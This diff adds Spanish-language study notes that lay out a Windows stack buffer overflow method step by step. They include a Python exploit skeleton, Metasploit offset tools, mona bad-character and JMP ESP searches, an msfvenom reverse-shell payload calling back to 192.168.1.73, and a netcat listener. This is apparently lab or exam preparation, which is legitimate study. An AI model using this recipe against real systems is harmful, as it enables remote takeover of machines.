@@ -1,0 +1,56 @@
+averiguar offset
+lanzar "A"*200
+
+esqueleto bof
+---------------
+#!/usr/bin/python
+import socket
+import sys
+from struct import pack
+
+## basura = "A"*1052   /identifacion de offset
+## EIP = pack("<I",0x68A98A7B) //little endian  //aca primerose pone el "B"*4 
+## shellcode =    //se usa para crear el payload con mfsvenom
+## NOPS = "\x90"*15 //esto se usa para dar espacio al shellcode para desempaquetar
+
+## Payload = basura + EIP + NOPS + shellcode
+
+s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.connect(('localhost', 8888))
+s.sendall((Payload))
+#data = s.recv(8096)
+s.close()
+print 'Paylad enviado!', repr(data)
+-------------------
+
+
+- conociendo el volcado, se hace offset con patter
+usr/share/metasploit-framework/tools/exploit/pattern_create.rb 5000 // se pone en basura, se saca el eip y se busca con patter_offset
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 316A4230 // con esto ya se identifica el offset y queda la basura "316A4230 es el EIP"
+- se pasa el EIP "B"*4 y despues se pasa el ESP de arriba "C"*100 <- esto se convierte en el badchar/shellcode bytearay
+
+- eliminar los badchars/shellcode, usar mona
+!mona config -set workingfolder path\%p
+!mona bytearray
+!mona compare -f path\bytearray.bin -a ESP_arriba
+!mona bytearray -cbp "\x00" <se debe colocar todos los que salgan en el compare>
+
+generar shellcode 
+msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.73 LPORT=4445 -a x86 --platform windows EXITFUNC=thread  -b "\x00" -f c
+
+!mona modules >>>> aca se debe escoger una libreria que tenga todo false, importante el ASLR (proteccion de memeoria desahbiltado)
+
+----- "\xFF\xE4"    = 32bits
+
+!mona find -s "\xFF\xE4" -m  modulo identificado "****.dll"  << cuando se encuentra se escoge uno de los que estan y se da doble clic, sebe mandar a un jmp esp>>
+se seleccionar la direccion de ese jmp esp y se cambia en el EIP del codigo "B"*4, se debe hacer el little endian
+
+EIP = pack("<I",0xaabbccddee)
+
+
+----agregar nops = "\x90"*15
+
+Payload = basura + EIP + NOPS + shellcode
+
+abrir nc con el puerto especificado nc -lnvp 4445
+./payload
